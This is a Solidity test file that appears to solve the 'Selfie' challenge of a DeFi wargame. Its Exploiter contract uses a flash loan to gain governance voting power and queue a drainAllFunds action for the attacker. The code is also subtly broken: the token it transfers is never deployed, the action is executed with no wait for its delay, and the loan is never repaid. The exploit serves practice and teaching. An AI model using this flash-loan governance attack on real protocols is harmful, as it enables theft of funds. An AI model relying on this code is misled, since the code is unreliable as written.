// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import {TestWithUsers}              from "../TestWithUsers.sol";

// Import contracts in question
import {SelfiePool}                 from "../selfie/SelfiePool.sol";
import {SimpleGovernance}           from "../selfie/SimpleGovernance.sol";
import {DamnValuableTokenSnapshot}  from "../DamnValuableTokenSnapshot.sol";
import {DamnValuableToken}         from "../DamnValuableToken.sol";


/**
    @notice Challenge #6 - Selfie

    @dev A new cool lending pool has launched! It's now offering flash loans of DVT 
    tokens. Wow, and it even includes a really fancy governance mechanism to control 
    it. What could go wrong, right ? You start with no DVT tokens in balance, and the 
    pool has 1.5 million. Your objective: take them all.
*/
contract SelfieTest is TestWithUsers {

    uint256 TOKEN_INITIAL_SUPPLY = 2_000_000 ether; // 2 million tokens
    uint256 TOKENS_IN_POOL = 1_500_000 ether;       // 1.5 million tokens
    
    SelfiePool pool;
    SimpleGovernance governance;   
    DamnValuableTokenSnapshot damnValuableTokenSnapshot;
    DamnValuableToken damnValuableToken;
    User attacker;

    function setUp() public {
        
        emit log_string('test');

        // Setup test user/users
        User[] memory users = getSigners(1);
        attacker = users[0];

        // Deploy test contracts
        damnValuableTokenSnapshot = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);
        governance = new SimpleGovernance(address(damnValuableTokenSnapshot));
        pool = new SelfiePool(address(damnValuableToken), address(governance));
        vm.label(attacker.account, 'ATTACKER');
        // Give the pool 1.5m tokens
        damnValuableToken.transfer(address(pool), TOKENS_IN_POOL);
    }
    function successConditions() internal {
        // Attacker has taken all tokens from the pool
        assertEq(damnValuableToken.balanceOf(attacker.account), TOKENS_IN_POOL);
        assertEq(damnValuableToken.balanceOf(address(pool)), 0);
    }

    Exploiter exploiter;

    function testRewarderExploit() public {
        exploiter = new Exploiter(
            damnValuableTokenSnapshot,
            governance,
            damnValuableToken,
            pool,
            attacker.account
        );

        vm.startPrank(attacker.account);
        exploiter.bad();
        successConditions(); 
    }
}

contract Exploiter {

    DamnValuableTokenSnapshot token;
    DamnValuableToken damnValuableToken;
    SimpleGovernance simpleGovernance;
    SelfiePool selfiePool;
    address badGuy;

    constructor(
        DamnValuableTokenSnapshot _token,
        SimpleGovernance _governance, 
        DamnValuableToken _damnValuableToken,
        SelfiePool _pool,
        address attacker
    ) public {
        token = _token;
        simpleGovernance = _governance;
        damnValuableToken = _damnValuableToken;
        selfiePool = _pool;
        badGuy = attacker;
        damnValuableToken.approve(address(simpleGovernance), type(uint256).max);
    }

    function bad() public {
        selfiePool.flashLoan(1_500_000 ether);
    }

    function receiveTokens(address damnValuableToken, uint256 amount) public {
        token.snapshot();
        bytes memory data = abi.encodeWithSignature("drainAllFunds(address)", badGuy);
        simpleGovernance.queueAction(badGuy, data, 1_500_000);
        simpleGovernance.executeAction(0);
    }
}